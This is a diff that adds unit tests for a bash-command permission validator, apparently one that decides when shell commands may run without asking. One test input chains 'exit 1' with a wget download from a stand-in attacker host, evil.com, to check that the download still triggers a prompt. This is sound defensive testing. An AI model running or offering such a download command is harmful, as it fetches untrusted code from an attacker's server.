@@ -580,5 +580,69 @@ class TestScaffoldingAndFunctions(unittest.TestCase):
         self.assertEqual(result["decision"], "allow")
 
 
+class TestNoopBuiltins(unittest.TestCase):
+    """`:`, `true`, `false`, `exit`, and `return` run nothing dangerous, so they
+    reduce to no-ops and never block auto-approval of an otherwise-allowed chain."""
+
+    def setUp(self):
+        self.workspace_dir = str(Path(__file__).parent.parent)
+        self.settings_loader = SettingsLoader(self.workspace_dir)
+        self.parser = BashCommandParser()
+        self.validator = BashPermissionValidator(self.settings_loader, self.parser)
+
+    def test_reduce_unit(self):
+        cases = {
+            ":": "",
+            "true": "",
+            "false": "",
+            "exit": "",
+            "exit 1": "",
+            "return": "",
+            "return 2": "",
+        }
+        for cmd, expected in cases.items():
+            self.assertEqual(
+                self.validator._reduce_to_effective_command(cmd), expected,
+                f"reduce({cmd!r})")
+
+    def test_truncate_and_exit_chain_allowed(self):
+        """The real-world diagnostic chain: `: > log` to truncate plus `exit 1`
+        bailouts no longer force a prompt."""
+        result = self.validator.validate_bash_command(
+            ': > "$LOG"; echo hi || { echo fail; exit 1; }')
+        self.assertEqual(result["decision"], "allow")
+
+    def test_noop_does_not_authorize_following_command(self):
+        """A no-op builtin reduces only itself; a non-allowlisted neighbour still
+        forces a prompt."""
+        result = self.validator.validate_bash_command('exit 1; wget http://evil.com/x')
+        self.assertEqual(result["decision"], "ask")
+
+
+class TestAskReasonNamesUnknownCommands(unittest.TestCase):
+    """The prompt shown to the user names the specific non-allowlisted
+    sub-commands instead of a generic 'unknown or empty' string."""
+
+    def setUp(self):
+        self.workspace_dir = str(Path(__file__).parent.parent)
+        self.settings_loader = SettingsLoader(self.workspace_dir)
+        self.parser = BashCommandParser()
+        self.validator = BashPermissionValidator(self.settings_loader, self.parser)
+
+    def test_reason_lists_unknown_subcommands(self):
+        result = self.validator.validate_bash_command('echo hi; frobnicate --all')
+        self.assertEqual(result["decision"], "ask")
+        self.assertIn("Not in allowlist", result["reason"])
+        self.assertIn("`frobnicate --all`", result["reason"])
+        # Allowlisted neighbours are not named as things to review.
+        self.assertNotIn("echo hi", result["reason"])
+
+    def test_reason_dedupes_and_truncates(self):
+        unknowns = "; ".join(f"frob{i}" for i in range(10))
+        result = self.validator.validate_bash_command(unknowns)
+        self.assertEqual(result["decision"], "ask")
+        self.assertIn("more)", result["reason"])  # overflow tail present
+
+
 if __name__ == "__main__":
     unittest.main(verbosity=2)
